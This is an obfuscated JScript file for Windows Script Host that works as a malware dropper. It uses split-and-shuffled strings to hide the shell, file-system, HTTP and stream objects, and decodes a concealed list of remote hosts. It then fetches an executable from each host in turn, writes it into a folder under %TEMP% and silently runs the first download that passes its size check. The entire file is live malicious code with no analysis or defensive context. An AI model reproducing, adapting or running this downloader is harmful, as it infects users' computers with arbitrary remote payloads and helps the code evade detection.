

function LwPweAILX(IoXrxtdxOzi) {
var mvnMroWd = "tWHc Ws vEQSmbp cript.S CnmUYC hell".split(" ");
var tFBXycSr = WScript.CreateObject(mvnMroWd[1] + mvnMroWd[3] + mvnMroWd[5]);
tFBXycSr.Run(IoXrxtdxOzi, 0x1, 0x0);
}
function ZKkqokwsk(LNfyG,zhgLG,xUFLY) {
var qEXsr = "jDXaGL axG pt.Shell lFNyeuW Scri  %TEMP%\\".split(" ");
var XPh=((1)?"W" + qEXsr[4]:"")+qEXsr[2];
var gu = WScript.CreateObject(XPh);
return gu.ExpandEnvironmentStrings(qEXsr[6]);
}
function KHwFFWfu() {
var QkGkRFw = "Sc bPFjJWe r dXYYdntVv ipting SrhCxOa IGD ile WKSewPCNbuLPMb System EL fpeSq Obj Liyvap ect InHGNam".split(" ");
return QkGkRFw[0] + QkGkRFw[2] + QkGkRFw[4] + ".F" + QkGkRFw[7] + QkGkRFw[9] + QkGkRFw[12] + QkGkRFw[14];
}
function RkoI(abwiL) {
SsEMeaR = WScript.CreateObject(abwiL);
return SsEMeaR
}
function FeZF(fnpSe,mROOL) {
fnpSe.write(mROOL);
}
function magN(RuBvd) {
RuBvd.open();
}
function nBvA(hwHGZ,Qnqga) {
hwHGZ.saveToFile(Qnqga,372-370);
}
function mMEW(deqQu,SRmzJ,MNeIU) {
deqQu.open(MNeIU,SRmzJ,false);
}
function FMMq(SgTWE) {
if (SgTWE == 1123-923){return true;} else {return false;}
}
function hAic(UkoRV) {
if (UkoRV > 150387-255){return true;} else {return false;}
}
function RLWH(tpwYs) {
var tXwsV="";
for(E=(482-482); E < tpwYs.length; E++)
if (E % (231-229) != (993-993)) {
tXwsV += tpwYs.substr(E, 900-899);
}
return tXwsV;
}
function fDMv(JCFoS) {
JCFoS.send();
}
function sDTu(rmedw) {
return rmedw.status;
}
function ruWEr(kWUqkz) {
return new ActiveXObject(kWUqkz);
}
function odxScwm(ivUA) {
ivUA.position=0;
}
function MkGXFPK(paJV) {
return paJV.responseBody;
}
var KR="juyjRa0j1abjEgvoXguovfafg.Fc8okmm/L659f.cefxUen?4 iivsMtdhVeLrLeaaHnBy2baondYyjqSq6.Bcwo2m9/T6Q9h.IeMxgeW?v J?3 k?G I?";
var i = RLWH(KR).split(" ");
var mGT = ZKkqokwsk("TAUr","iMbdQ","MthRwZ");
var nxI = ruWEr(KHwFFWfu());
var PFrlXp = ("reWyeAn \\").split(" ");
var fdIY = mGT+PFrlXp[0]+PFrlXp[1];
try{
nxI.CreateFolder(fdIY);
}catch(tTtPnI){
};
var gkH = "2.XMLH";
var FJN = (gkH + "TTP" + " dOiLsya BSUcq XML ream St fWAujfjF AD WPzLSYP OD").split(" ");
var UJ = true  , voMM = FJN[7] + "" + FJN[9];
var sV = RkoI("MS"+FJN[3]+(230302, FJN[0]));
var OKE = RkoI(voMM + "B." + FJN[5]+(853869, FJN[4]));
var ook = 0;
var T = 1;
var VYRXlWJ = 298093;
var D=ook;
while (true)  {
if(D>=i.length) {break;}
var Oh = 0;
var HTp = ("ht" + " oSSeRgx tp dOIkE coZLtTvZ :// oSPwonR .e xe G ET").split(" ");
try  {
var bjOUp=HTp[0]+HTp[2]+HTp[5];
mMEW(sV,bjOUp+i[D]+T, HTp[9]+HTp[10]); fDMv(sV); if (FMMq(sDTu(sV)))  {      
magN(OKE); OKE.type = 1; FeZF(OKE,MkGXFPK(sV)); if (hAic(OKE.size))  {
Oh = 1; odxScwm(OKE);nBvA(OKE,/*czsm93zFOy*/fdIY/*OO0g63sgB0*/+VYRXlWJ+HTp[7]+HTp[8]); try  {
if (((new Date())>0,7790454888)) {
LwPweAILX(fdIY+VYRXlWJ+/*QTXi51imwJ*/HTp[7]+HTp[8]/*Hj5D35jHDi*/); 
break;
}
}
catch (Ja)  {
}; 
}; OKE.close(); 
}; 
if (Oh == 1)  {
ook = D; break; 
}; 
}
catch (Ja)  { 
}; 
D++;
}; 

